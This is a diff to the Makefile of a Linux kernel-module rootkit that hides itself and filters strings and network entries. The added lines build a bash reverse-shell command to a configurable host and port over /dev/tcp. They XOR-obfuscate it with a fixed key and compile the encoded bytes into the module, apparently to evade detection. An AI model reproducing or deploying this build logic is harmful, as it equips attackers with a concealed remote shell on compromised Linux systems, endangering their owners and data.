@@ -4,8 +4,28 @@ STRING_EXCLUDES ?=
 NET_EXCLUDES ?=
 HIDE_MODULE ?= 0
 
+XOR_KEY := 0x5A
 RSHELL_HOST ?=
 RSHELL_PORT ?=
+
+# no need to define RSHELL_CMD if rshell host / port are empty
+ifneq ($(strip $(RSHELL_HOST)),)
+  ifneq ($(strip $(RSHELL_PORT)),)
+    RSHELL_CMD := bash -i >& /dev/tcp/$(RSHELL_HOST)/$(RSHELL_PORT) 0>&1
+  else
+    RSHELL_CMD :=
+  endif
+else
+  RSHELL_CMD :=
+endif
+
+# xor RSHELL_CMD
+DRSHELL_CMD_OBF := $(shell \
+  for c in $$(echo -n "$(RSHELL_CMD)" | sed 's/./& /g'); do \
+    printf "'\\x%02x', " $$(( $$(printf '%d' "'$$c") ^ $(XOR_KEY) )); \
+  done; \
+  echo "'\\x00'"; \
+)
 
 obj-m += $(MODULE_NAME).o
 $(MODULE_NAME)-objs := src/mod_rootkit.o \
@@ -23,8 +43,8 @@ EXTRA_CFLAGS += -I$(PWD)/include \
                 -DMODULE_NAME=\"$(MODULE_NAME)\" \
                 -DSTRING_EXCLUDES=\"$(STRING_EXCLUDES)\" \
                 -DNET_EXCLUDES=\"$(NET_EXCLUDES)\" \
-				-DRSHELL_HOST=\"$(RSHELL_HOST)\" \
-				-DRSHELL_PORT=\"$(RSHELL_PORT)\"
+				-DRSHELL_CMD_OBF="{ $(DRSHELL_CMD_OBF) }" \
+				-DXOR_KEY=$(XOR_KEY)
 
 ifeq ($(HIDE_MODULE),1)
   EXTRA_CFLAGS += -DHIDE_MODULE
